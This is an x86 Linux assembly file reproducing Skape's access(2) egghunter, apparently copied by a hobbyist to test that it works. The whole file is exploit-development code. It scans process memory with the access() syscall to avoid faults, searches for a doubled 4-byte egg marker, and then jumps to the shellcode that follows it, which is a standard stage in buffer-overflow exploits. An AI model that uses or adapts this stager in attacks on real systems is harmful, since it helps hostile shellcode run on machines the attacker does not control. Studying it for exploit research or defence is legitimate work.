; Skape's egghunter: access(2) revised 
;It's exactly the same .I am just testing its working
;All hail Skape 


global _start  

section .text  

_start:  
xor edx, edx            ; EDX = 0  
IncPage:  
or dx, 0xfff            ; Align page address  
IncAddr:  
inc edx                 ; Go to next address  
lea ebx, [edx+0x4]      ; [edx+4] so we can compare [edx] and [edx+4] at the same time  
push byte 0x21          ; syscall for access()  
pop eax  
int 0x80                ; call access() to check memory location [EBX]  
cmp al, 0xf2            ; Did it return EFAULT?  
jz IncPage              ; It did, skip page  
mov eax, 0x50905090     ; Store EGG in EAX  
mov edi, edx            ; Move EDX to EDI for scasd operation  
scasd                   ; Check if [EDI] == EAX then increment EDI  
jnz IncAddr             ; It isn't, increment address  
scasd                   ; Check if [EDI] == EAX then increment EDI  
jnz IncAddr             ; It isn't, increment address  
jmp edi                 ; We found our Egg! JMP to EDI, which points directly to our shellcode  
